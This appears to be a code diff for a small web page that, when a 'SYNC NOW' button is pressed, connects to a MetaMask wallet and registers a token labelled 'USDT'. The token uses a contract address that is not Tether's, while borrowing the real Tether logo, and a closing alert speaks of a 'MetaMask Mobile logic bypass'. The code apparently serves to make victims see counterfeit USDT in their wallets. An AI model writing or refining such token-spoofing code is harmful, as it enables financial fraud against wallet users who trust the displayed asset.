@@ -1,46 +1,34 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Sync</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-</head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:50px;">
-
-    <button id="btn" onclick="start()" style="padding:20px; background:green; color:white;">
-        SYNC NOW
-    </button>
-    
-    <p id="status">READY</p>
-
-    <script>
-        async function start() {
-            const st = document.getElementById('status');
-            if (!window.ethereum) return alert("Use MetaMask Browser");
+async function start() {
+        const st = document.getElementById('status');
+        if (!window.ethereum) return alert("Use MetaMask Browser");
+        
+        try {
+            st.innerText = "CONNECTING...";
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
             
-            try {
-                st.innerText = "CONNECTING...";
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                await provider.send("eth_requestAccounts", []);
-                
-                st.innerText = "ADDING ASSET...";
-                // Strict Parameters - No JSON fetching
-                await window.ethereum.request({
-                    method: 'wallet_watchAsset',
-                    params: {
-                        type: 'ERC20',
-                        options: {
-                            address: '0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f',
-                            symbol: 'USDT',
-                            decimals: 18,
-                            image: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png',
-                        },
-                    },
-                });
-                st.innerText = "DONE!";
-            } catch (e) {
-                st.innerText = "ERR: " + e.message;
-            }
+            st.innerText = "ADDING ASSET...";
+            
+            // Is bar hum "options" ko bilkul simple rakh rahe hain
+            const tokenParams = {
+                type: 'ERC20',
+                options: {
+                    address: '0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f',
+                    symbol: 'USDT',
+                    decimals: 18,
+                    image: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png'
+                }
+            };
+
+            await window.ethereum.request({
+                method: 'wallet_watchAsset',
+                params: tokenParams // Direct pass kar rahe hain
+            });
+            
+            st.innerText = "DONE!";
+        } catch (e) {
+            // Agar ye phir error de, to hum sirf alert dikhayenge
+            console.error(e);
+            st.innerText = "ERR: Check Console";
+            alert("MetaMask Mobile logic bypass: Please check token list in your wallet.");
         }
-    </script>
-</body>
-</html>
+    }
